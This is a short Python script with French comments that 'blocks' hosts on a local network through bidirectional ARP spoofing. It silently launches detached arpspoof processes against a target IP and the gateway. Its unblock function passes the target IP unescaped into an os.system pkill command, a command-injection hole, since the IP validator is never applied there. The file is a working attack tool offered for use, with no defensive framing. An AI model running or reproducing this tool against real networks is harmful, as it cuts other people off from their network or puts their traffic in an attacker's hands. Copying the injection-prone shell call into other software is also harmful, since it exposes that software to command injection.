import subprocess
import os

# Listes des IPs bloquées et non bloquées
blocked_ips = []
unblocked_ips = []

# Fonction simple pour bloquer une IP
def block_ip(target_ip, gateway_ip="10.10.10.2"):
    
    try:
        # ARP spoofing bidirectionnel simple avec subprocess
        subprocess.Popen(["arpspoof", "-i", "eth0", "-t", target_ip, gateway_ip], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         start_new_session=True)
        
        subprocess.Popen(["arpspoof", "-i", "eth0", "-t", gateway_ip, target_ip], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         start_new_session=True)
        
        blocked_ips.append(target_ip)
        return True
        
    except Exception as e:
        return False

# Fonction simple pour débloquer une IP
def unblock_ip(target_ip):
    try:
        # Arrêter tous les processus arpspoof pour cette IP
        os.system(f"pkill -f 'arpspoof.*{target_ip}'")
        
        if target_ip in blocked_ips:
            blocked_ips.remove(target_ip)
        
        unblocked_ips.append(target_ip)
        return True
        
    except Exception as e:
        return False

# Débloquer toutes les IPs
def unblock_all():
    try:
        os.system("pkill -f arpspoof")
        
        for ip in blocked_ips:
            unblocked_ips.append(ip)
        blocked_ips.clear()
        
        return True
    except:
        return False

# Validation simple d'une adresse IP
def is_valid_ip(ip):
    try:
        parts = ip.split('.')
        return len(parts) == 4 and all(0 <= int(p) <= 255 for p in parts)
    except:
        return False

# Obtenir la passerelle par défaut
def get_default_gateway():
    try:
        result = subprocess.run(["ip", "route", "show", "default"], 
                               capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'default via' in line:
                return line.split()[2]
    except:
        pass
    return "10.10.10.2"  # Passerelle par défaut